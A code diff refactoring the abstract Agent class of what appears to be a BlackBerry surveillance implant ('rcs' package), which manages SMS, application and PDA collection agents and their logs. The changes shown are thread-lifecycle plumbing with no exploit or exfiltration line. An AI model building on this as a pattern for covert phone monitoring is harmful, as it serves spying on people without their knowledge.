@@ -7,15 +7,14 @@
  * *************************************************/
 package com.ht.rcs.blackberry.agent;
 
-import com.ht.rcs.blackberry.Common;
 import com.ht.rcs.blackberry.Status;
 import com.ht.rcs.blackberry.log.Log;
 import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import com.ht.rcs.blackberry.utils.StartStopThread;
 
-public abstract class Agent extends Thread {
+public abstract class Agent extends StartStopThread {
     private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
 
     public static final int AGENT = 0x1000;
@@ -38,7 +37,7 @@ public abstract class Agent extends Thread {
     public static final int AGENT_APPLICATION = AGENT + 0x11;
     public static final int AGENT_PDA = 0xDF7A;
 
-    public static Agent factory(int agentId, int agentStatus, byte[] confParams) {
+    public static Agent factory(int agentId, boolean agentStatus, byte[] confParams) {
         switch (agentId) {
         case AGENT_SMS:
             debug.trace("Factory AGENT_SMS");
@@ -95,7 +94,7 @@ public abstract class Agent extends Thread {
         default:
             debug.trace("AgentId UNKNOWN: " + agentId);
             return null;
-        }
+        }               
     }
 
     Status status;
@@ -105,51 +104,22 @@ public abstract class Agent extends Thread {
     boolean logOnSD;
     public int agentId;
 
-    public int agentStatus;
+    //public int agentStatus;
 
-    public int command;
+    //public int command;
 
     protected Log log;
 
-    protected Agent(int agentId_, int agentStatus_, boolean logOnSD_) {
+    protected Agent(int agentId_, boolean agentEnabled, boolean logOnSD_) {
         status = Status.getInstance();
         logCollector = LogCollector.getInstance();
 
         this.agentId = agentId_;
-        this.agentStatus = agentStatus_;
-
+        
         this.logOnSD = logOnSD_;
         this.log = logCollector.factory(this, logOnSD_);
-    }
-
-    public abstract void agentRun();
-
-    protected boolean agentSleep(int millisec) {
-        int loops = 0;
-        int sleepTime = 1000;
-
-        if (millisec < sleepTime) {
-            Utils.sleep(millisec);
-
-            if (command == Common.AGENT_STOP) {
-                return true;
-            }
-
-            return false;
-        } else {
-            loops = millisec / sleepTime;
-        }
-
-        while (loops > 0) {
-            Utils.sleep(millisec);
-            loops--;
-
-            if (command == Common.AGENT_STOP) {
-                return true;
-            }
-        }
-
-        return false;
+        
+        enable(agentEnabled);
     }
 
     public boolean onSD() {
@@ -158,28 +128,7 @@ public abstract class Agent extends Thread {
 
     protected abstract boolean parse(byte[] confParameters);
 
-    public void run() {
-        if (log == null) {
-            debug.fatal("log null");
-            return;
-        }
-
-        status.agentAlive(agentId);
-        agentRun();
-        status.threadAgentStopped(agentId);
-    }
-
-    protected boolean sleepUntilStopped() {
-        for (;;) {
-            if (agentSleep(10 * 1000)) {
-                status.threadAgentStopped(agentId);
-                debug.trace("Agent.java - CleanStop " + agentId);
-                return true;
-            }
-        }
-    }
-
     public String toString() {
-        return "Agent " + agentId;
+        return "Agent:" + agentId;
     }
 }
